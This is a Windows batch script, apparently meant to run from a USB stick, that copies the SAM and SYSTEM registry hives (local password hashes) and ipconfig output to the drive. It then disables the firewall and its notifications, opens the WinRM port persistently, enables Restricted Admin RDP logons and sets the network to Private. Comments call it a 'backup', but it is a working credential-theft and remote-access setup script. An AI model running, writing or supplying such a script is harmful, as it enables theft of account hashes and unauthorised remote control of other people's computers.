@echo off

REM Specify the drive letter for the USB stick
set USBDrive=D:

REM Create a folder on the USB drive to store the ipconfig output
set FolderName=IPConfigBackup
set BackupPath=%USBDrive%\%FolderName%

REM Create the backup folder if it doesn't already exist
if not exist "%BackupPath%" (
    mkdir "%BackupPath%"
)


REM Run ipconfig and save the output to a file
ipconfig > "%BackupPath%\ipconfig_output.txt"






REM Specify the drive letter for the USB stick
set USBDrive=D:

REM Create a folder on the USB drive to store the registry files
set FolderName=RegistryBackup
set BackupPath=%USBDrive%\%FolderName%

REM Create the backup folder if it doesn't already exist
if not exist "%BackupPath%" (
    mkdir "%BackupPath%"
)


REM Save HKLM\sam
reg save HKLM\sam "%BackupPath%\sam.save"
if %errorlevel% equ 0 (
    echo HKLM\sam saved successfully as sam.save on the USB drive.
) else (
    echo Error saving HKLM\sam.
)

REM Save HKLM\system
reg save HKLM\system "%BackupPath%\system.save"
if %errorlevel% equ 0 (
    echo HKLM\system saved successfully as system.save on the USB drive.
) else (
    echo Error saving HKLM\system.
)




REM Disable the Windows Firewall
netsh advfirewall set allprofiles state off

if %errorlevel% equ 0 (
    echo Windows Firewall has been disabled successfully.
) else (
    echo Error disabling Windows Firewall.
)
REM Disable firewall notifications
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f

if %errorlevel% equ 0 (
    echo Firewall notifications have been disabled successfully.
) else (
    echo Error disabling firewall notifications.
)

REM open port for WinRM, i try to find way to let it open after reboot
set PortNumber=5985

netsh advfirewall firewall add rule name="Open Port 5985 (WinRM)" dir=in action=allow protocol=TCP localport=5985 profile=any persistent=yes enable=yes




REM Add registry value to disable Restricted Admin mode
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

if %errorlevel% equ 0 (
    echo Registry value added successfully to disable Restricted Admin mode.
) else (
    echo Error adding registry value to disable Restricted Admin mode.
)



REM Use PowerShell to get the network profile name
for /f "delims=" %%i in ('powershell -command "Get-NetConnectionProfile | Select-Object -ExpandProperty Name"') do (
    set "profileName=%%i"
)

REM Check if the profileName variable is not empty and then set the network category to Private
if defined profileName (
    powershell -command "Set-NetConnectionProfile -Name '%profileName%' -NetworkCategory Private"
    echo Network category set to Private for network: %profileName%
) else (
    echo Unable to retrieve the network profile name.
)







